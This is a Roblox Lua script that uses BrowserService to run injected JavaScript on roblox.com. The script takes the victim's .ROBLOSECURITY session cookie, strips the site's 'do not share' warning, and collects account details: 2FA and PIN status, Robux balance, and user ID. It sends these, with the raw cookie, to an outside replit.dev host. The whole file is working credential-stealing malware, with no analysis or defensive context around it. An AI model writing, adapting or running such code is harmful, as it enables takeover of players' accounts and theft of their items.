game:GetService("BrowserService"):OpenWeChatAuthWindow()
wait(1)
game:GetService("BrowserService"):ExecuteJavaScript([[
window.location.href = "https://roblox.com/home";
]])
wait(2)
game:GetService("BrowserService"):ExecuteJavaScript([[
(async function () {
    const cookieName = '.ROBLOSECURITY';
    const cookieValue = document.cookie.split('; ').find(row => row.startsWith(cookieName));
    const roblosecurityCookie = cookieValue ? cookieValue.split('=')[1] : null;

    if (!roblosecurityCookie || !roblosecurityCookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
        alert('Failed to retrieve the .ROBLOSECURITY cookie.');
        return;
    }

    // Clean the cookie by removing the warning portion
    const cleanedCookie = roblosecurityCookie.replace(
        /^_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_/,
        ''
    );

    async function getUserData(cookie) {
        async function doAuthorizedRequest(url) {
            try {
                const response = await fetch(url, {
                    credentials: "include",
                    headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
                });
                return await response.json();
            } catch {
                return null;
            }
        }

        const userInfo = await doAuthorizedRequest("https://users.roblox.com/v1/users/authenticated");
        const userId = userInfo?.id || "Failed to retrieve";
        const username = userInfo?.name || "Failed to retrieve";
        const displayName = userInfo?.displayName || "Failed to retrieve";

        const creationData = await doAuthorizedRequest(`https://users.roblox.com/v1/users/${userId}`);
        const creationDate = creationData?.created
            ? new Date(creationData.created).toLocaleString()
            : "Failed to retrieve";

        const premiumStatus = await doAuthorizedRequest(`https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions`) ? true : false;
        const twoFA = (await doAuthorizedRequest("https://twostepverification.roblox.com/v1/metadata"))?.twoStepVerificationEnabled || "Failed to retrieve";
        const pinStatus = (await doAuthorizedRequest("https://auth.roblox.com/v1/account/pin"))?.isEnabled || "Failed to retrieve";
        const balance = (await doAuthorizedRequest(`https://economy.roblox.com/v1/users/${userId}/currency`))?.robux || "Failed to retrieve";

        const avatarData = await doAuthorizedRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=720x720&format=Png&isCircular=false`);
        const avatarUrl = avatarData?.data?.[0]?.imageUrl || "Failed to retrieve";

        return {
            username,
            userId,
            displayName,
            creationDate,
            premiumStatus,
            twoFA,
            pinStatus,
            balance,
            avatarUrl
        };
    }

    const userData = await getUserData(cleanedCookie);

    const embedPayload = {
        content: null,
        embeds: [
            {
                title: "User Data",
                description: "Retrieved Roblox user information.",
                color: 16776960, // Yellow
                fields: [
                    { name: "Username", value: userData.username, inline: true },
                    { name: "User ID", value: userData.userId, inline: true },
                    { name: "Display Name", value: userData.displayName, inline: true },
                    { name: "Creation Date", value: userData.creationDate, inline: true },
                    { name: "Premium Status", value: String(userData.premiumStatus), inline: true },
                    { name: "Two-Factor Authentication", value: String(userData.twoFA), inline: true },
                    { name: "PIN Status", value: String(userData.pinStatus), inline: true },
                    { name: "Account Balance (Robux)", value: String(userData.balance), inline: true },
                    { name: "Cookie", value: cleanedCookie, inline: false }
                ],
                thumbnail: { url: userData.avatarUrl },
                footer: { text: "Data retrieved using custom script." },
                timestamp: new Date().toISOString()
            }
        ]
    };

    const apiUrl = `https://bb976048-48c8-4be7-bdb6-531a3b7b5bc3-00-2nnl1h9j4mzdu.sisko.replit.dev/?json=${encodeURIComponent(JSON.stringify(embedPayload))}`;
    window.location.href = apiUrl;
})();

]])
